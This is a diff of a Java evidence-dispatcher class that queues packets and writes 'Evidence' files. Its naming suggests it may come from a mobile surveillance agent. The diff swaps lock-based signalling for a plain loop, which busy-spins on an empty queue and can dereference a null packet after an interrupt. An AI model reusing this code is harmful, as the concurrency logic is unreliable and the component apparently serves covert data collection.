@@ -13,6 +13,7 @@ import java.io.File;
 import java.util.HashMap;
 import java.util.concurrent.BlockingQueue;
 import java.util.concurrent.LinkedBlockingQueue;
+import java.util.concurrent.TimeUnit;
 import java.util.concurrent.locks.Condition;
 import java.util.concurrent.locks.Lock;
 import java.util.concurrent.locks.ReentrantLock;
@@ -45,12 +46,12 @@ public class EvDispatcher extends Thread implements Runnable {
 	private File sdDir;
 
 	/** The lock. */
-	final Lock lock = new ReentrantLock();
+	// final Lock lock = new ReentrantLock();
 
 	/** The no logs. */
-	final Condition noLogs = lock.newCondition();
+	// final Condition noLogs = lock.newCondition();
 
-	private Object emptyQueue = new Object();
+	//private Object emptyQueue = new Object();
 
 	/*
 	 * private BroadcastReceiver mExternalStorageReceiver; private boolean
@@ -66,7 +67,7 @@ public class EvDispatcher extends Thread implements Runnable {
 
 		queue = new LinkedBlockingQueue<Packet>();
 		evidences = new HashMap<Long, Evidence>();
-		
+
 		if (Cfg.DEBUG) {
 			setName(getClass().getSimpleName());
 		}
@@ -86,7 +87,7 @@ public class EvDispatcher extends Thread implements Runnable {
 	 * Process queue.
 	 */
 	private void processQueue() {
-		Packet p;
+		Packet p=null;
 
 		if (queue.size() == 0) {
 			return;
@@ -94,17 +95,12 @@ public class EvDispatcher extends Thread implements Runnable {
 
 		try {
 			p = queue.take();
-			Thread.yield();
-		} catch (final InterruptedException e) {
-			if (Cfg.EXCEPTION) {
-				Check.log(e);
-			}
-
+		} catch (InterruptedException e) {
 			if (Cfg.DEBUG) {
-				Check.log(e);//$NON-NLS-1$
+				Check.log(TAG + " (processQueue) Error: " + e);
 			}
-			return;
 		}
+
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (processQueue) command: " + p.getCommand());
 		}
@@ -121,13 +117,20 @@ public class EvDispatcher extends Thread implements Runnable {
 		case EvidenceReference.LOG_WRITE:
 			writeEv(p);
 			break;
-			
+
 		case EvidenceReference.LOG_ITEMS:
 			itemsEv(p);
 			break;
 
 		case EvidenceReference.LOG_CLOSE:
 			closeEv(p);
+			break;
+			
+		case EvidenceReference.INTERRUPT:
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (processQueue), INTERRUPT");
+			}
+			halt=true;
 			break;
 
 		default:
@@ -175,42 +178,17 @@ public class EvDispatcher extends Thread implements Runnable {
 		// Debug - used to remove the directory
 		// sdDir();
 
-		while (true) {
-			lock.lock();
-
-			try {
-				while (queue.isEmpty() && !halt) {
-					synchronized (emptyQueue) {
-						emptyQueue.notifyAll();
-					}
-					noLogs.await();
-				}
-
-				// Halt command has precedence over queue processing
-				if (halt == true) {
-					queue.clear();
-					evidences.clear();
-
-					if (Cfg.DEBUG) {
-						Check.log(TAG + " LogDispatcher closing"); //$NON-NLS-1$
-					}
-
-					return;
-				}
-
-				processQueue();
-			} catch (final Exception e) {
-				if (Cfg.EXCEPTION) {
-					Check.log(e);
-				}
-
-				if (Cfg.DEBUG) {
-					Check.log(e);//$NON-NLS-1$
-				}
-			} finally {
-				lock.unlock();
-			}
+		while (!halt) {
+			processQueue();
 		}
+
+		queue.clear();
+		evidences.clear();
+
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " LogDispatcher closing"); //$NON-NLS-1$
+		}
+
 	}
 
 	/**
@@ -220,16 +198,11 @@ public class EvDispatcher extends Thread implements Runnable {
 	 *            the packet
 	 * @return true, if successful
 	 */
-	public synchronized boolean send(final Packet packet) {
-		lock.lock();
-		boolean added = false;
+	public void send(final Packet packet) {
 
 		try {
-			added = queue.add(packet);
+			queue.add(packet);
 
-			if (added) {
-				noLogs.signal();
-			}
 		} catch (final Exception e) {
 			if (Cfg.EXCEPTION) {
 				Check.log(e);
@@ -238,25 +211,20 @@ public class EvDispatcher extends Thread implements Runnable {
 			if (Cfg.DEBUG) {
 				Check.log(e);//$NON-NLS-1$
 			}
-		} finally {
-			lock.unlock();
 		}
 
-		return added;
 	}
 
 	/**
 	 * Halt.
 	 */
-	public synchronized void halt() {
-		lock.lock();
-
-		try {
-			halt = true;
-			noLogs.signal();
-		} finally {
-			lock.unlock();
+	public void halt() {
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (halt)");
 		}
+		halt = true;
+		queue.add(new Packet());
+
 	}
 
 	/**
@@ -295,7 +263,7 @@ public class EvDispatcher extends Thread implements Runnable {
 
 		final byte[] additional = p.getAdditional();
 		final byte[] data = p.getData();
-		
+
 		final Evidence evidence = new Evidence(p.getType());
 
 		evidence.createEvidence(additional);
@@ -308,8 +276,8 @@ public class EvDispatcher extends Thread implements Runnable {
 			Check.ensures(!evidences.containsKey(p.getId()), "evidence already mapped"); //$NON-NLS-1$
 		}
 
-		//final byte[] additional = p.getAdditional();
-		final byte[] data = p.getData();		
+		// final byte[] additional = p.getAdditional();
+		final byte[] data = p.getData();
 		final Evidence evidence = new Evidence(p.getType());
 
 		evidence.atomicWriteOnce(p.getItems());
@@ -366,34 +334,9 @@ public class EvDispatcher extends Thread implements Runnable {
 				Check.log(TAG + " ERROR (closeLog): evidence==null");
 			}
 		}
-		
+
 		evidences.remove(p.getId());
 		return true;
 	}
 
-	/**
-	 * da chiamare solo dopo aver chiamato la AgentManager.stopAll()
-	 */
-	public void waitOnEmptyQueue() {
-		try {
-			synchronized (emptyQueue) {
-				if (queue.isEmpty()) {
-					return;
-				}
-
-				if (Cfg.DEBUG) {
-					Check.log(TAG + " (waitOnEmptyQueue)");
-				}
-				emptyQueue.wait();
-			}
-		} catch (Exception ex) {
-			if (Cfg.EXCEPTION) {
-				Check.log(ex);
-			}
-
-			if (Cfg.DEBUG) {
-				Check.log(ex);
-			}
-		}
-	}
 }
